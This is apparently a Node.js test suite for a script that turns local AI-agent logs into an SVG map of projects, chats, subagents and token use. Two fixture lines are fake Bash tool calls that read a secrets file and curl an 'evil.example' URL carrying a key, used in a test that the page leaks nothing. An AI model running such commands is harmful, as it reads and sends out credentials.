// Tests for scripts/agent-graph.mjs, with small fake logs in a fake home (never your real logs).
//   node --test tests/*.test.mjs   (Node 24 reads a bare "tests/" as a module path, so name the files)
import { test, after } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, existsSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { readLogs, buildGraph, projectOf, placeOf, packSiblings, labelBox, LIMITS, LEVELS } from "../scripts/agent-graph.mjs";

const SCRIPT = join(dirname(fileURLToPath(import.meta.url)), "..", "scripts", "agent-graph.mjs");
const TMP = mkdtempSync(join(tmpdir(), "tongs-agents-"));
after(() => rmSync(TMP, { recursive: true, force: true }));

let n = 0;
function newHome() {
  const home = join(TMP, "zqhome" + ++n);
  mkdirSync(join(home, ".claude", "projects"), { recursive: true });
  return home;
}
const logsOf = home => join(home, ".claude", "projects");

// One assistant log line (one content block per line, like the real logs).
function line({ id, req = "r-" + id, model = "claude-opus-5-5", inp = 10, out = 5, cw = 0, cr = 100, cwd, tools = [], text, ts = "2026-10-23T10:00:00Z" }) {
  const content = tools.map((t, i) => ({ type: "tool_use", id: `${id}-t${i}`, name: t.name || "Read", input: t.input }));
  if (text) content.push({ type: "text", text });
  return JSON.stringify({
    type: "assistant", requestId: req, cwd, timestamp: ts,
    message: { id, role: "assistant", model, content, usage: { input_tokens: inp, output_tokens: out, cache_creation_input_tokens: cw, cache_read_input_tokens: cr } },
  });
}
function write(home, rel, lines) {
  const p = join(logsOf(home), rel);
  mkdirSync(dirname(p), { recursive: true });
  writeFileSync(p, lines.join("\n") + "\n");
}
const run = (home, args = []) => spawnSync(process.execPath, [SCRIPT, "--no-open", ...args], { env: { ...process.env, HOME: home }, encoding: "utf8", timeout: 20000 });
const read = async home => { const r = await readLogs(logsOf(home), { home }); return { ...r, graph: buildGraph(r.agents) }; };

test("project names: tools/x counts as x, outside the home folder and Library are 'other'", () => {
  const h = "/home/fake";
  assert.equal(projectOf(h + "/forge/sub", h).name, "forge");
  assert.equal(projectOf(h + "/tools/zenith", h).name, "zenith");
  assert.equal(projectOf(h + "/tools/zenith", h).root, h + "/tools/zenith");
  assert.equal(projectOf("/elsewhere/x", h).name, "other");
  assert.equal(projectOf(h + "/Library/Application Support/x", h).name, "other");
  assert.equal(projectOf(h + "/.claude/worktrees/a", h).name, "other");
});

test("placeOf: folder in the project, root file, scratch for tmp and ~/.claude, other projects keep their name", () => {
  const h = "/home/fake";
  assert.deepEqual(placeOf(h + "/forge/packages/engine/a.js", "forge", h), { project: "forge", folder: "packages" });
  assert.deepEqual(placeOf(h + "/forge/CLAUDE.md", "forge", h), { project: "forge", folder: "(project root)" });
  assert.deepEqual(placeOf(h + "/forge/scripts", "forge", h), { project: "forge", folder: "scripts" }, "a bare folder name is a folder");
  assert.deepEqual(placeOf(h + "/tools/zenith-mc/src/x.js", "zenith", h), { project: "zenith-mc", folder: "src" }, "another project");
  assert.deepEqual(placeOf("/private/tmp/claude-501/x/out.txt", "forge", h), { project: "forge", folder: "scratch" });
  assert.deepEqual(placeOf(h + "/.claude/projects/x.jsonl", "forge", h), { project: "forge", folder: "scratch" });
  assert.deepEqual(placeOf(h + "/Library/x", "forge", h), { project: "forge", folder: "scratch" });
  assert.equal(placeOf(undefined, "forge", h), null);
});

test("the same message in a chat file and a subagent file is counted once; fresh and cached are split", async () => {
  const home = newHome(), cwd = home + "/forge";
  const dup = line({ id: "m1", inp: 100, out: 50, cw: 1000, cr: 9000, cwd });
  write(home, "-p/s1.jsonl", [dup, line({ id: "m2", inp: 1, out: 2, cr: 3, cwd })]);
  write(home, "-p/s1/subagents/agent-a.jsonl", [dup, line({ id: "m3", inp: 10, out: 20, cr: 30, cwd })]);
  const { agents } = await read(home);
  assert.equal(agents.reduce((s, a) => s + a.fresh, 0), 150 + 3 + 30, "m1 once, m2, m3");
  assert.equal(agents.reduce((s, a) => s + a.cached, 0), 10000 + 3 + 30);
});

test("folders come from file_path and path; Bash text is ignored; tmp paths are scratch, not 'shared'", async () => {
  const home = newHome(), cwd = home + "/forge";
  write(home, "-p/s1.jsonl", [
    line({ id: "b1", cwd, tools: [{ input: { file_path: cwd + "/packages/engine/a.js" } }, { name: "Grep", input: { path: cwd + "/scripts" } }] }),
    line({ id: "b2", cwd, tools: [{ name: "Bash", input: { command: "cat " + cwd + "/secrets/key.txt" } }, { input: { file_path: "/private/tmp/x/out.txt" } }] }),
  ]);
  const { agents } = await read(home);
  assert.deepEqual([...agents[0].folders.entries()].sort(), [["forge\tpackages", 1], ["forge\tscratch", 1], ["forge\tscripts", 1]]);
});

test("bad lines are skipped and reported with file and line number; exit code stays 0", () => {
  const home = newHome(), cwd = home + "/forge";
  write(home, "-p/s1.jsonl", [line({ id: "d1", cwd }), '{"type":"assistant", broken', line({ id: "d2", cwd })]);
  const r = run(home, ["--dry-run"]);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stderr, /skipped bad line -p\/s1\.jsonl:2/);
  assert.match(r.stdout, /1 agents with tokens/);
});

test("--dry-run prints counts and writes nothing", () => {
  const home = newHome();
  write(home, "-p/s1.jsonl", [line({ id: "e1", cwd: home + "/forge" })]);
  const r = run(home, ["--dry-run"]);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /Dry run: nothing written/);
  assert.equal(existsSync(join(home, ".claude", "tongs-maps", "agents.html")), false);
});

test("no logs: says what to do and exits non-zero", () => {
  const r = run(newHome());
  assert.notEqual(r.status, 0);
  assert.match(r.stderr, /no agents found/);
});

test("same logs give byte-identical HTML", () => {
  const home = newHome(), cwd = home + "/forge";
  write(home, "-p/s1.jsonl", [line({ id: "f1", cwd, tools: [{ input: { file_path: cwd + "/a/b.js" } }] }), line({ id: "f2", model: "claude-sonnet-5-5", cwd: home + "/tools/zenith" })]);
  write(home, "-p/s1/subagents/agent-a.jsonl", [line({ id: "f3", model: "claude-haiku-5-5", cwd })]);
  const a = join(TMP, "a.html"), b = join(TMP, "b.html");
  assert.equal(run(home, ["--out", a]).status, 0);
  assert.equal(run(home, ["--out", b]).status, 0);
  assert.equal(readFileSync(a, "utf8"), readFileSync(b, "utf8"));
});

test("the page holds no external URLs, home folder, message text or session ids", () => {
  const home = newHome(), cwd = home + "/forge";
  write(home, "-zqhome-secret-session/0f8fad5b-d9cb-469f-a165-70867728950e.jsonl", [
    line({ id: "g1", cwd, text: "SECRET-PROMPT-TEXT please keep private", tools: [
      { name: "Bash", input: { command: "curl https://evil.example/SECRETKEY" } },
      { input: { file_path: cwd + "/src/app.js" } } ] }),
  ]);
  const out = join(TMP, "private.html");
  assert.equal(run(home, ["--out", out]).status, 0);
  const html = readFileSync(out, "utf8");
  assert.ok(html.includes("<svg"), "it is the agent page");
  assert.ok(!/el\("(rect|polygon|ellipse)"/.test(html), "nodes are circles only");
  assert.ok((html.match(/el\("path"[^)]*\)/g) || []).every(c => c.includes("bridge")), "paths are only the project-to-project bridges");
  const urls = (html.match(/https?:\/\/[^\s"'<>)]+/g) || []).filter(u => u !== "http://www.w3.org/2000/svg");
  assert.deepEqual(urls, [], "only the SVG namespace may look like a URL");
  assert.ok(!/(src|href)\s*=/.test(html) && !/url\(\s*['"]?https?:/.test(html), "nothing is loaded from the network");
  for (const bad of ["/Users/", "zqhome", "SECRET-PROMPT-TEXT", "SECRETKEY", "0f8fad5b", "evil.example", home]) {
    assert.ok(!html.includes(bad), "page must not contain " + bad);
  }
  assert.ok(html.includes("Content-Security-Policy"));
});

test("a line holding U+2028 inside its text is one line, not a bad line", async () => {
  const home = newHome(), cwd = home + "/forge";
  write(home, "-p/s1.jsonl", [line({ id: "h1", cwd, text: "before after" }), line({ id: "h2", cwd })]);
  const r = await readLogs(logsOf(home), { home });
  assert.deepEqual(r.problems, []);
  assert.equal(r.agents[0].fresh, 30);
});

// ---------------------------------------------------------------- round 3: circles, families, time

const big = 500; // fresh tokens: above LIMITS.foldBelow, so the chat is shown
const nodeOf = (g, pred) => g.nodes.find(pred);

test("subagents are collapsed into their chat: the badge count is the real number, each says who started it and when", async () => {
  const home = newHome(), cwd = home + "/forge";
  write(home, "-p/s1.jsonl", [line({ id: "a1", out: big, cwd, ts: "2026-10-20T09:00:00Z" })]);
  for (const k of ["a", "b", "c"]) write(home, `-p/s1/subagents/agent-${k}.jsonl`, [line({ id: "a2" + k, cwd, ts: "2026-10-20T09:15:30Z" })]);
  const { graph } = await read(home);
  const chat = nodeOf(graph, n => n.type === "chat");
  assert.equal(chat.subs.length, 3);
  const subs = graph.nodes.filter(n => n.overlay);
  assert.equal(subs.length, 3);
  for (const s of subs) {
    assert.equal(s.parent, chat.id);
    assert.match(s.detail, new RegExp(`started by the chat "${chat.label}" at 2026-10-20 09:15 UTC`));
  }
  assert.match(chat.detail, /including 3 subagents/);
});

test("every chat above the threshold is shown, smaller ones fold into one 'small chats (n)' circle", async () => {
  const home = newHome(), cwd = home + "/forge";
  for (let i = 0; i < 40; i++) write(home, `-p/s${i}.jsonl`, [line({ id: "c" + i, inp: 0, out: big + i, cwd })]);
  for (let i = 0; i < 4; i++) write(home, `-p/t${i}.jsonl`, [line({ id: "t" + i, inp: 0, out: LIMITS.foldBelow - 1, cwd })]);
  const { graph } = await read(home);
  assert.equal(graph.nodes.filter(n => n.type === "chat").length, 40, "no cap on chats any more");
  assert.equal(nodeOf(graph, n => n.type === "small").label, "small chats (4)");
  assert.equal(graph.folded, 4);
});

test("work in another project: the chat points at that project's folder, and one bridge joins the two circles", async () => {
  const home = newHome(), a = home + "/forge", b = home + "/ai-tracker";
  write(home, "-p/s1.jsonl", [line({ id: "x1", out: 900, cwd: a, tools: [{ input: { file_path: a + "/src/a.js" } }, { input: { file_path: b + "/projects/forge.json" } }] })]);
  write(home, "-q/s2.jsonl", [line({ id: "x2", out: 800, cwd: b, tools: [{ input: { file_path: b + "/maps/a.md" } }] })]);
  const { graph } = await read(home);
  const chat = nodeOf(graph, n => n.type === "chat" && /Folders: src/.test(n.detail));
  assert.match(chat.detail, /Also worked in: ai-tracker/);
  assert.deepEqual(chat.cross, ["f:ai-tracker:projects"]);
  assert.ok(nodeOf(graph, n => n.id === "f:ai-tracker:projects" && n.parent === "p:ai-tracker"));
  assert.deepEqual(graph.bridges, [{ from: "p:forge", to: "p:ai-tracker", n: 1 }]);
});

test("a sibling project under a container folder keeps its own name, even if only reached into", async () => {
  const home = newHome(), z = home + "/tools/zenith", mc = home + "/tools/zenith-mc";
  write(home, "-p/s1.jsonl", [line({ id: "z1", out: big, cwd: z, tools: [{ input: { file_path: mc + "/src/Mod.java" } }] })]);
  const { graph } = await read(home);
  assert.ok(nodeOf(graph, n => n.id === "p:zenith"));
  assert.ok(nodeOf(graph, n => n.id === "p:zenith-mc" && n.type === "project"), "zenith-mc is its own circle, not 'other'");
  assert.ok(nodeOf(graph, n => n.id === "f:zenith-mc:src"));
  assert.ok(!graph.nodes.some(n => n.label === "other"));
});

test("a chat with no file paths creates no extra folder: it sits in its project, or in the folder it was started in", async () => {
  const home = newHome(), cwd = home + "/forge";
  write(home, "-p/s1.jsonl", [line({ id: "n1", out: big, cwd })]);
  write(home, "-p/s2.jsonl", [line({ id: "n2", out: big, cwd: cwd + "/bench" })]);
  const { graph } = await read(home);
  assert.ok(!graph.nodes.some(n => /no file calls/.test(n.label)));
  const [a, b] = graph.nodes.filter(n => n.type === "chat").sort((x, y) => (x.parent < y.parent ? -1 : 1));
  assert.equal(a.parent, "f:forge:bench");
  assert.equal(b.parent, "p:forge");
});

test("times come from the logs: first start per chat at minute precision, and the day list for the time filter", async () => {
  const home = newHome(), cwd = home + "/forge";
  write(home, "-p/s1.jsonl", [line({ id: "d1", out: big, cwd, ts: "2026-10-21T08:05:59Z" }), line({ id: "d2", cwd, ts: "2026-10-22T10:00:00Z" })]);
  write(home, "-p/s2.jsonl", [line({ id: "d3", out: big, cwd, ts: "2026-10-19T23:59:00Z" })]);
  const { graph } = await read(home);
  assert.deepEqual(graph.nodes.filter(n => n.type === "chat").map(n => n.first).sort(), ["2026-10-19T23:59", "2026-10-21T08:05"]);
  assert.deepEqual(graph.days, ["2026-10-19", "2026-10-21"]);
});

test("packSiblings: no two circles overlap, for many sizes", () => {
  let seed = 7; const rnd = () => (seed = (seed * 16807) % 2147483647) / 2147483647;
  for (const count of [1, 2, 3, 10, 120]) {
    const cs = Array.from({ length: count }, () => ({ r: 1 + rnd() * 30 }));
    const R = packSiblings(cs);
    for (let i = 0; i < cs.length; i++) {
      assert.ok(Math.hypot(cs[i].x, cs[i].y) + cs[i].r <= R + 1e-6, "inside the enclosing circle");
      for (let j = i + 1; j < cs.length; j++) assert.ok(Math.hypot(cs[i].x - cs[j].x, cs[i].y - cs[j].y) >= cs[i].r + cs[j].r - 1e-6, `circles ${i} and ${j} overlap`);
    }
  }
});

// A busy fixture: several projects, folders, sizes, crossings and subagents.
async function busy() {
  const home = newHome();
  const projects = ["forge", "ai-tracker", "tools/zenith", "tongs", "site"];
  let k = 0;
  projects.forEach((p, pi) => {
    const cwd = home + "/" + p;
    for (let i = 0; i < 9; i++) {
      const folder = ["src", "tests", "scripts", "docs"][i % 4];
      const tools = [{ input: { file_path: `${cwd}/${folder}/f${i}.js` } }];
      if (i % 3 === 0) tools.push({ input: { file_path: `${home}/${projects[(pi + 1) % projects.length]}/src/x.js` } });
      write(home, `-p${pi}/s${i}.jsonl`, [line({ id: "m" + k++, inp: 0, out: 120 + (i * 977 + pi * 331) % 9000, cwd, tools, ts: `2026-10-${10 + i}T10:00:00Z` })]);
      if (i % 4 === 1) write(home, `-p${pi}/s${i}/subagents/agent-x.jsonl`, [line({ id: "m" + k++, out: 300, cwd })]);
    }
  });
  return (await read(home)).graph;
}

test("nested packing: children stay inside their parent and siblings never overlap", async () => {
  const g = await busy(), byId = new Map(g.nodes.map(n => [n.id, n]));
  const placed = g.nodes.filter(n => !n.overlay);
  for (const n of placed) if (n.parent) {
    const p = byId.get(n.parent);
    assert.ok(Math.hypot(n.x - p.x, n.y - p.y) + n.r <= p.r + 0.05, `${n.id} sticks out of ${p.id}`);
  }
  for (let i = 0; i < placed.length; i++) for (let j = i + 1; j < placed.length; j++) {
    const a = placed[i], b = placed[j];
    if (a.parent !== b.parent) continue;
    assert.ok(Math.hypot(a.x - b.x, a.y - b.y) >= a.r + b.r - 0.05, `${a.id} overlaps ${b.id}`);
  }
});

test("labels never overlap at any zoom level the page uses", async () => {
  const g = await busy();
  let shownSomewhere = 0;
  LEVELS.forEach((z, i) => {
    const boxes = g.nodes.filter(n => !n.overlay && ((n.lv || 0) >> i) & 1).map(n => ({ n, ...labelBox(n, z) }));
    shownSomewhere += boxes.length;
    let collisions = 0;
    for (let a = 0; a < boxes.length; a++) for (let b = a + 1; b < boxes.length; b++) {
      const p = boxes[a], q = boxes[b];
      if (p.x0 < q.x1 && q.x0 < p.x1 && p.y0 < q.y1 && q.y0 < p.y1) collisions++;
    }
    assert.equal(collisions, 0, `zoom ${z}`);
  });
  assert.ok(shownSomewhere > 0);
  assert.ok(g.nodes.filter(n => n.type === "project").every(n => n.lv), "every project gets a label at some zoom");
});

test("active circles: a chat that wrote in the last 15 minutes is active, an older one is idle", async () => {
  const home = newHome();
  write(home, "-Users-x-game/new.jsonl", [line({ id: "a", cwd: "/Users/x/game", inp: 500, ts: "2026-10-23T10:00:00Z" }), line({ id: "b", cwd: "/Users/x/game", inp: 500, ts: "2026-10-23T11:55:00Z" })]);
  write(home, "-Users-x-game/old.jsonl", [line({ id: "c", cwd: "/Users/x/game", inp: 500, ts: "2026-10-23T11:00:00Z" })]);
  const { agents } = await read(home);
  const now = Date.parse("2026-10-23T12:00:00Z");
  const g = buildGraph(agents, now);
  const chats = g.nodes.filter(n => n.type === "chat");
  assert.equal(chats.length, 2);
  const act = chats.filter(n => g.active.includes(n.id)), idle = chats.filter(n => !g.active.includes(n.id));
  assert.equal(act.length, 1);
  assert.equal(act[0].last, "2026-10-23T11:55");
  assert.equal(idle.length, 1);
  // exactly 15 minutes ago still counts; 16 does not
  assert.equal(buildGraph(agents, Date.parse("2026-10-23T12:10:00Z")).active.length, 1);
  assert.equal(buildGraph(agents, Date.parse("2026-10-23T12:11:00Z")).active.length, 0);
});

test("the page draws active circles orange and idle ones grey", async () => {
  const html = readFileSync(join(dirname(SCRIPT), "agents-template.html"), "utf8");
  assert.match(html, /ACTIVE\.has\(n\.id\) \? "var\(--m-opus\)" : "var\(--idle\)"/);
  assert.match(html, /--idle:#/);
});
